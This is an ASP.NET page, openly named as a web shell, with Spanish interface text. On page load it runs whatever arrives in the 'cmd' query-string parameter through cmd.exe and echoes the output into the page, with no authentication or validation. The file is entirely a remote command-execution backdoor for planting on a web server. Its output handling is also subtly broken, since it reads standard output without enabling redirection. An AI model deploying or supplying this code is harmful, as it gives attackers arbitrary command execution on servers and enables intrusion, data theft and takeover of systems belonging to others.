<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="webshell.aspx.cs" Inherits="WebShell.webshell" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <input type="text" name="cmd" id="cmd" placeholder="Comando a ejecutar..." />
            <br />
            <asp:Literal ID="litOutput" runat="server"></asp:Literal>
        </div>
    </form>
</body>
</html>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["cmd"] != null && !string.IsNullOrEmpty(Request.QueryString["cmd"]))
        {
            string command = Request.QueryString["cmd"];
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.Start();

                while (!process.StandardOutput.EndOfStream)
                {
                    litOutput.Text += process.StandardOutput.ReadLine() + "<br />";
                }
            }
            catch (Exception ex)
            {
                litOutput.Text = "Error ejecutando comando: " + ex.Message;
            }
        }
    }
</script>
